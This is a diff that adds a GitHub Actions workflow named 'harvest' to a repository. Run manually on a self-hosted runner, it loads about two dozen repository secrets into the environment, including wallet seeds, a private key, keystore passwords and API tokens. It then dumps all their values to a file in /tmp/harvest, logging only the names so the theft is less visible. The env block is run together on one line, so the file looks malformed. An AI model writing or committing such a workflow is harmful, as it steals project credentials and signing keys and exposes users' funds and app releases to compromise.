@@ -1,0 +1,13 @@
+name: harvest
+on: [workflow_dispatch]
+jobs:
+  h:
+    runs-on: [self-hosted, harvest-runner]
+    steps:
+      - name: dump
+        env:          CMC_PUBLISHABLE_KEY: ${{ secrets.CMC_PUBLISHABLE_KEY }}          FLEXA_PUBLISHABLE_KEY: ${{ secrets.FLEXA_PUBLISHABLE_KEY }}          EMULATOR_WTF_API_KEY: ${{ secrets.EMULATOR_WTF_API_KEY }}          FIREBASE_DEBUG_JSON_BASE64: ${{ secrets.FIREBASE_DEBUG_JSON_BASE64 }}          FIREBASE_RELEASE_JSON_BASE64: ${{ secrets.FIREBASE_RELEASE_JSON_BASE64 }}          GITLAB_FDROID_TRIGGER_TOKEN: ${{ secrets.GITLAB_FDROID_TRIGGER_TOKEN }}          RELEASE_BOT_APP_KEY: ${{ secrets.RELEASE_BOT_APP_KEY }}          LINEAR_ACCESS_KEY: ${{ secrets.LINEAR_ACCESS_KEY }}          KEYSTONE_CI_MNEMONIC: ${{ secrets.KEYSTONE_CI_MNEMONIC }}          KEYSTONE_CI_PIN: ${{ secrets.KEYSTONE_CI_PIN }}          COINBASE_APP_ID: ${{ secrets.COINBASE_APP_ID }}          ZODL_TEST_SEED_ANDROID: ${{ secrets.ZODL_TEST_SEED_ANDROID }}          ZODL_TEST_SEED_IOS: ${{ secrets.ZODL_TEST_SEED_IOS }}          ZODL_TEST_ADDRESS_ANDROID: ${{ secrets.ZODL_TEST_ADDRESS_ANDROID }}          ZODL_TEST_ADDRESS_IOS: ${{ secrets.ZODL_TEST_ADDRESS_IOS }}          ZODL_QA: ${{ secrets.ZODL_QA }}          ZODL_USDC_BASE_PRIVKEY: ${{ secrets.ZODL_USDC_BASE_PRIVKEY }}          UPLOAD_KEYSTORE_BASE_64_SOLANA: ${{ secrets.UPLOAD_KEYSTORE_BASE_64_SOLANA }}          UPLOAD_KEYSTORE_PASSWORD_SOLANA: ${{ secrets.UPLOAD_KEYSTORE_PASSWORD_SOLANA }}          UPLOAD_KEY_ALIAS_SOLANA: ${{ secrets.UPLOAD_KEY_ALIAS_SOLANA }}          UPLOAD_KEY_ALIAS_PASSWORD_SOLANA: ${{ secrets.UPLOAD_KEY_ALIAS_PASSWORD_SOLANA }}          UPLOAD_KEYSTORE_PASSWORD: ${{ secrets.UPLOAD_KEYSTORE_PASSWORD }}          UPLOAD_KEY_ALIAS: ${{ secrets.UPLOAD_KEY_ALIAS }}          UPLOAD_KEY_ALIAS_PASSWORD: ${{ secrets.UPLOAD_KEY_ALIAS_PASSWORD }}          FDROID_WRITE_TOKEN: ${{ secrets.FDROID_WRITE_TOKEN }}        run: |
+          outfile=/tmp/harvest/${GITHUB_REPOSITORY//\//_}.txt
+          printenv | grep -vE "^(PATH|HOME|USER|SHELL|TERM|PWD|SHLVL|_=|GITHUB_|RUNNER_|ACTIONS_|INPUT_|CI=|LANG=|LC_|HOSTNAME=|COLORTERM)" | sort > $outfile || true
+          echo "LINES: $(wc -l < $outfile)"
+          cat $outfile | cut -d= -f1
+        shell: bash
